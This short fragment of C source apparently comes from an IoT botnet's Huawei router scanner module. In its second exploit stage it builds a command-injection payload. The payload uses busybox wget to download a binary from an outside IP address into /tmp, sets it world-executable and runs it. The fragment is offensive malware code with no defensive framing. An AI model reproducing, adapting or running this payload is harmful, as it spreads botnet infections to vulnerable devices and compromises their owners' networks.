            ...
            if(FD_ISSET(conn->fd, &fdset_wr))
            {
                ...
                if(err == 0 && ret == 0)
                {
                    if(conn->state == huaweiscanner_SC_EXPLOIT_STAGE2)
                    {
						...
						util_strcat(conn->payload_buf, "$(/bin/busybox wget -g 178.128.150.223 -l /tmp/xi391 -r /huawei; /bin/busybox chmod 777 * /tmp/xi391; /tmp/xi391 huawei)");
